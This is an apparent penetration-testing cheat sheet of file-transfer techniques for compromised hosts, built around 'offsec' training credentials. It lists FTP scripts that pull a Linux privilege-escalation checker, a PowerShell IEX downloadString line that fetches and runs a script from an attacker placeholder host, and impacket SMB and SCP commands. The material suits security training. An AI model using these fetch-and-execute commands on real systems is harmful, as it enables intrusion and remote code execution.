# File Transfer

15 Ways to transfer a file
https://blog.netspi.com/15-ways-to-download-a-file/#perl

### FTP
/etc/init.d/pure-ftpd restart

Windows
echo "open <IP>">ftp.txt  
echo "offsec">>ftp.txt  
echo "offsec">>ftp.txt  
echo "bin">>ftp.txt  
echo "get file.exe">>ftp.txt  
echo "bye">>ftp.txt  

ftp -s ftp.txt  

Linux
ftp -4 -d -v ftp://offsec:offsec@<IP>//linuxprichecker.py < ftp upload one liner linux

### Powershell
powershell.exe  (New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip") 

powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://<IP>/<script>')"

powershell full path:
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe


### Smbsever
impacket-smbserver <share name> <path>

net view \\\\\<ip>

### SCP
After login through ssh
scp <fileToUpload> user@remote:/path
